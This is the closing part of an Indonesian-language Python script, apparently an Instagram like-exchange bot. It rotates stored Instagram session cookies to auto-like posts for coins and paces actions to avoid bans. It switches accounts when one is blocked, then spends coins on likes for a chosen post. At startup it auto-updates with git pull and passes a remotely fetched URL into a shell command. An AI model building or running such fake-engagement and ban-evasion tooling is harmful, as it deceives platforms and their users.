                    Panel(f"[bold white]Silakan Masukkan[bold green] Delay[bold white], Gunakan Delay Di Atas[bold red] 15[bold white] Detik Agar Akun Instagram Tidak[bold red] Terbanned[bold white]!", style="bold bright_black", width=60, title="[bold bright_black]>> [Delay] <<", title_align="center", subtitle="[bold bright_black]╭───────", subtitle_align="left")
                )
                self.delay = int(Console().input("[bold bright_black]   ╰─> "))
                printf(
                    Panel(f"[bold white]Anda Bisa Menggunakan[bold yellow] CTRL + C[bold white] Jika Misi Stuck Dan Gunak\nan[bold red] CTRL + Z[bold white] Jika Ingin Berhenti.\n*[bold red]Kalau Misi Gagal Terus Kemungkinan Akun Anda Terblokir[bold white]!", style="bold bright_black", width=60, title="[bold bright_black]>> [Catatan] <<", title_align="center")
                )
                while True:
                    try:
                        for cookies in COOKIE:
                            CACHE.clear()
                            self.cookies, self.username_ig = cookies.split('|')
                            if LOGIN().ADD_CONFIGURATION(self.tokentds, self.username_ig) == True:
                                self.mission = MISSION().LIKE(self.tokentds, self.delay, self.username_ig, self.cookies)
                                if self.mission["Message"] == "TIDAK ADA MISI YANG TERSEDIA!":
                                    printf(f"[bold bright_black]   ──>[bold red] TIDAK ADA MISI YANG TERSEDIA!     ", end='\r')
                                    time.sleep(4.5)
                                    continue
                                elif self.mission["Message"] == "GAGAL MENYUKAI USER!":
                                    printf(
                                        Panel(f"[bold red]Maaf, Kami Mendeteksi Akun Instagram Anda Gagal Menyuk\nai Sebanyak Lebih Dari 15 Kali, Kami\nSedang Mengubah Akun Instagram Untuk Menjalankan Misi!", style="bold bright_black", width=60, title="[bold bright_black]>> [Terblokir] <<", title_align="center")
                                    )
                                    time.sleep(4.5)
                                    continue
                                else:
                                    pass
                            else:
                                continue
                        printf(f"[bold bright_black]   ──>[bold green] SEMUA MISI TELAH SELESAI!     ", end='\r')
                        time.sleep(4.5)
                        continue
                    except KeyboardInterrupt:
                        printf(f"                         ", end='\r')
                        time.sleep(2.5)
                        continue
                    except RequestException:
                        printf(f"[bold bright_black]   ──>[bold red] KONEKSI ERROR!     ", end='\r')
                        time.sleep(10.5)
                        continue
            except (Exception) as error:
                printf(
                    Panel(f"[bold red]{str(error).title()}!", style="bold bright_black", width=60, title="[bold bright_black]>> [Error] <<", title_align="center")
                )
                sys.exit()
        elif self.choices in ["4", "04"]:
            try:
                printf(
                    Panel(f"[bold white]Silakan Masukkan Link Postingan Instagram, Misalnya :[bold green] https://www.instagram.com/p/CeIOs3kr2Cw/", style="bold bright_black", width=60, title="[bold bright_black]>> [Postingan] <<", title_align="center", subtitle="[bold bright_black]╭───────", subtitle_align="left")
                )
                self.link = Console().input("[bold bright_black]   ╰─> ").strip()
                printf(
                    Columns(
                        [
                            Panel("[bold green]50[bold white] Like >[bold green] 35.000[bold white] Koin", width=29, style="bold bright_black"),
                            Panel("[bold green]1000[bold white] Like >[bold green] 700.000", width=30, style="bold bright_black")
                        ]
                    )
                )
                printf(
                    Panel(f"[bold white]Silakan Masukkan Jumlah Like, Harap Isi Dengan[bold red] Angka[bold white] Dan Minimal 50 Like, Misalnya :[bold green] 1000 *Like!", style="bold bright_black", width=60, title="[bold bright_black]>> [Jumlah Like] <<", title_align="center", subtitle="[bold bright_black]╭───────", subtitle_align="left")
                )
                self.jumlah = int(Console().input("[bold bright_black]   ╰─> "))
                EXCHANGE().LIKES(self.cookiestds, self.link, self.jumlah)
                sys.exit()
            except (Exception) as error:
                printf(
                    Panel(f"[bold red]{str(error).title()}!", style="bold bright_black", width=60, title="[bold bright_black]>> [Error] <<", title_align="center")
                )
                sys.exit()
        elif self.choices in ["5", "05"]:
            try:
                GET().PENDING(self.cookiestds)
                sys.exit()
            except (Exception) as error:
                printf(
                    Panel(f"[bold red]{str(error).title()}!", style="bold bright_black", width=60, title="[bold bright_black]>> [Error] <<", title_align="center")
                )
                sys.exit()
        elif self.choices in ["6", "06"]:
            try:
                os.remove('Penyimpanan/Cookies.json')
                os.remove('Penyimpanan/Cookies.txt')
                printf(
                    Panel(f"[bold green]Terima Kasih Telah Menggunakan Program Ini, Semoga Anda Puas Dengan Hasil Yang Didapatkan!", style="bold bright_black", width=60, title="[bold bright_black]>> [Keluar] <<", title_align="center")
                )
                sys.exit()
            except:
                sys.exit()
        else:
            printf(
                Panel(f"[bold red]Maaf, Pilihan Yang Anda Masukkan Tidak Tersedia, Silak\nan Coba Lagi!", style="bold bright_black", width=60, title="[bold bright_black]>> [Pilihan Salah] <<", title_align="center")
            )
            time.sleep(4.5)
            FEATURE()

if __name__ == '__main__':
    try:
        os.system('git pull')
        if not os.path.exists("Penyimpanan/Subscribe.json"):
            youtube_url = requests.get("https://raw.githubusercontent.com/RozhakXD/InstaSub/refs/heads/main/Penyimpanan/Youtube.json").json()["Link"]
            os.system(f"xdg-open {youtube_url}")
            with open("Penyimpanan/Subscribe.json", "w") as w:
                json.dump({"Status": True}, w, indent=4)
            time.sleep(2.5)
        FEATURE()
    except (Exception) as error:
        printf(
            Panel(f"[bold red]{str(error).title()}!", style="bold bright_black", width=60, title="[bold bright_black]>> [Error] <<", title_align="center")
        )
        sys.exit()
    except KeyboardInterrupt:
        sys.exit()